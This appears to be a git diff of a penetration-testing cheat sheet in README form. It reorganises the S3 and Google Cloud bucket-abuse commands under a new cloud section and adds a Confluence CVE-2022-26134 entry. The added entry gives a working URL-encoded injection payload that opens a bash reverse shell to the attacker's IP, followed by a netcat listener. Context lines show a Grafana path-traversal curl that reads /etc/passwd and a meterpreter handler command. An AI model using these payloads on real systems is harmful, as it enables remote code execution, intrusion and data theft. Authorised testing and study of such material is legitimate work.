@@ -98,8 +98,6 @@ I try as much as possible to link to the various sources or inspiration for thes
   - [HTTP request smuggling](#http-request-smuggling)
   - [OAuth authentication](#oauth-authentication)
   - [JWT Attacks](#jwt-attacks)
-  - [Abusing S3 Bucket Permissions](#abusing-s3-bucket-permissions)
-  - [Google Cloud Storage bucket](#google-cloud-storage-bucket)
   - [GraphQL](#graphql)
   - [WordPress](#wordpress)
   - [IIS - Internet Information Services](#iis---internet-information-services)
@@ -182,6 +180,9 @@ I try as much as possible to link to the various sources or inspiration for thes
     - [ToDo](#todo)
     - [Thread Injection](#thread-injection)
     - [Shellter](#shellter)
+- [Cloud hacking](#cloud-hacking)
+  - [Abusing S3 Bucket Permissions](#abusing-s3-bucket-permissions)
+  - [Google Cloud Storage bucket](#google-cloud-storage-bucket)
 - [Artificial intelligence vulnerabilities](#artificial-intelligence-vulnerabilities)
   - [Prompt Injection](#prompt-injection)
 
@@ -2727,55 +2728,6 @@ Vulnerabilities in the OAuth service
 
 
 
-### <ins>Abusing S3 Bucket Permissions</ins>
-
-Target example: `http://[name_of_bucket].s3.amazonaws.com`
-
-**Read Permission**
-
-- `aws s3 ls s3://[name_of_bucket]  --no-sign-request`
-- `aws s3 ls s3://pyx-pkgs --recursive --human-readable --summarize`
-
-**Write Permission**
-
-- `aws s3 cp localfile s3://[name_of_bucket]/test_file.txt –-no-sign-request`
-
-**READ_ACP**
-
-- `aws s3api get-bucket-acl --bucket [bucketname] --no-sign`
-- `aws s3api get-object-acl --bucket [bucketname] --key index.html --no-sign-request`
-
-**WRITE_ACP**
-
-- `aws s3api put-bucket-acl --bucket [bucketname] [ACLPERMISSIONS] --no-sign-request`
-- `aws s3api put-object-acl --bucket [bucketname] --key file.txt [ACLPERMISSIONS] --no-sign-request`
-
-**Tools**
-- [Anonymous Cloud](https://portswigger.net/bappstore/ea60f107b25d44ddb59c1aee3786c6a1)
-- [AWS CLI](https://aws.amazon.com/it/cli/)
-- [S3Scanner](https://github.com/sa7mon/S3Scanner) A tool to find open S3 buckets and dump their contents
-- [Cloud - AWS Pentest](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest.md)
-- [s3enum](https://github.com/koenrh/s3enum)
-- To find secrets, you can use [trufflehog](https://github.com/trufflesecurity/trufflehog).
-
-**Resources**
-- https://blog.yeswehack.com/yeswerhackers/abusing-s3-bucket-permissions/
-- https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_examples_s3_rw-bucket.html
-
-
-
-### <ins>Google Cloud Storage bucket</ins>
-
-**Tools**
-- [Anonymous Cloud](https://portswigger.net/bappstore/ea60f107b25d44ddb59c1aee3786c6a1)
-- https://github.com/RhinoSecurityLabs/GCPBucketBrute
-
-**Resources**
-- https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
-- https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/
-
-
-
 ### <ins>GraphQL</ins>
 
 To analyze the schema: [vangoncharov.github.io/graphql-voyager/](https://ivangoncharov.github.io/graphql-voyager/) or [InQL](https://github.com/doyensec/inql) for Burp Suite.
@@ -2917,6 +2869,15 @@ Common API path convention: `/api_name/v1`
 - `curl --path-as-is http://<TARGET>:3000/public/plugins/alertlist/../../../../../../../../etc/passwd`
   - Check also for sqlite3 database `/var/lib/grafana/grafana.db` and `conf/defaults.ini` config file
 
+
+### <ins>Confluence attacks</ins>
+
+
+#### CVE-2022-26134
+
+1. See: [Active Exploitation of Confluence CVE-2022-26134](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/)
+2. `curl http://<Confluence-IP>:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/<YOUR-IP>/<YOUR-PORT>%200%3E%261%27%29.start%28%29%22%29%7D/`
+3. Run a listener `nc -nvlp 4444`
 
 ## Client-Side Attacks
 
@@ -4508,6 +4469,57 @@ Example of usage
 7. Create a listener in Kali with Metasploit
    - `msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <IP>;set LPORT <PORT>;run;"`
 8. Get the meterpreter shell on the attacking machine
+
+
+
+## Cloud hacking
+
+### <ins>Abusing S3 Bucket Permissions</ins>
+
+Target example: `http://[name_of_bucket].s3.amazonaws.com`
+
+**Read Permission**
+
+- `aws s3 ls s3://[name_of_bucket]  --no-sign-request`
+- `aws s3 ls s3://pyx-pkgs --recursive --human-readable --summarize`
+
+**Write Permission**
+
+- `aws s3 cp localfile s3://[name_of_bucket]/test_file.txt –-no-sign-request`
+
+**READ_ACP**
+
+- `aws s3api get-bucket-acl --bucket [bucketname] --no-sign`
+- `aws s3api get-object-acl --bucket [bucketname] --key index.html --no-sign-request`
+
+**WRITE_ACP**
+
+- `aws s3api put-bucket-acl --bucket [bucketname] [ACLPERMISSIONS] --no-sign-request`
+- `aws s3api put-object-acl --bucket [bucketname] --key file.txt [ACLPERMISSIONS] --no-sign-request`
+
+**Tools**
+- [Anonymous Cloud](https://portswigger.net/bappstore/ea60f107b25d44ddb59c1aee3786c6a1)
+- [AWS CLI](https://aws.amazon.com/it/cli/)
+- [S3Scanner](https://github.com/sa7mon/S3Scanner) A tool to find open S3 buckets and dump their contents
+- [Cloud - AWS Pentest](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest.md)
+- [s3enum](https://github.com/koenrh/s3enum)
+- To find secrets, you can use [trufflehog](https://github.com/trufflesecurity/trufflehog).
+
+**Resources**
+- https://blog.yeswehack.com/yeswerhackers/abusing-s3-bucket-permissions/
+- https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_examples_s3_rw-bucket.html
+
+
+
+### <ins>Google Cloud Storage bucket</ins>
+
+**Tools**
+- [Anonymous Cloud](https://portswigger.net/bappstore/ea60f107b25d44ddb59c1aee3786c6a1)
+- https://github.com/RhinoSecurityLabs/GCPBucketBrute
+
+**Resources**
+- https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
+- https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/
 
 
 
